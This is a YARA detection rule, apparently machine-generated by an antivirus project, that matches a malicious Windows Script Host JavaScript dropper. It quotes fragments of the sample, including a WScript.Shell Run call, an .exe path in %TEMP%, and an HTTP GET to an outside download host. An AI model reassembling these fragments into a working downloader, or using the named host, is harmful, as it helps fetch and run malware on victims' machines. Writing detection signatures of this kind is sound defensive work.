rule sig_20160328_de7a041f3dc907e31c924a49d74e540f {
  meta:
    description = "datamaliciousorder - file 20160328_de7a041f3dc907e31c924a49d74e540f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5a221a5d88421e31e028a50d3b9873cf7d1319b334f6785c19ae1259f2a3a0d8"

  strings:
    $s1  = "function Ictcert() {return Ukfej[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"d6gzawQa6n9B87Mw.exe\";};" fullword ascii
    $s2  = "Kjwyatlt[Hueli](\"GET\", \"http://zapableapp.com/l1sape\", false);" fullword ascii
    $s3  = "do {WScript[Rrrpnh](Zvsaunil() * 11)} while (Kjwyatlt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ukfej = function Woyivmywq() {return WScript[Dflrwzk](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hlwiwomba(Iwutsc, Auofxxyp){return Iwutsc - Auofxxyp;};" fullword ascii
    $s6  = "function Ewvbwxn(Mssqldybc){Ukfej[\"Run\"](Mssqldybc, Xymrzqsl, Xymrzqsl);};" fullword ascii
    $s7  = "function Loryqzdh() {return ((Tkunwzjqkf == true) && (Tkunwzjqkf == Ljqpkzi)) ? 1 : Xymrzqsl;};" fullword ascii
    $s8  = "var Vnjmqzpa = new this[\"Date\"]();" fullword ascii
    $s9  = "function Pkbvqceu(Dhckhmdtky) {var Bubktj = (1, 2, 3, 4, 5, Dhckhmdtky); return Bubktj;};" fullword ascii
    $s10 = "var Tkunwzjqkf = false;" fullword ascii
    $s11 = "Tkunwzjqkf = true; " fullword ascii
    $s12 = "Ljqpkzi = true; " fullword ascii
    $s13 = " while (Xkxlypqrpw){" fullword ascii
    $s14 = "var Ribffz = false;" fullword ascii
    $s15 = "var Ljqpkzi = false;" fullword ascii
    $s16 = "function Bcyqhram(){return Ktfvqz;};" fullword ascii
    $s17 = "function Cbkflvpp(){return Dflrwzk;};" fullword ascii
    $s18 = "function Iqtiepaufi()" fullword ascii
    $s19 = "function Zvsaunil(){return 22;};" fullword ascii
    $s20 = "return Hlwiwomba(Ddedsqszp, Vzxpez);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}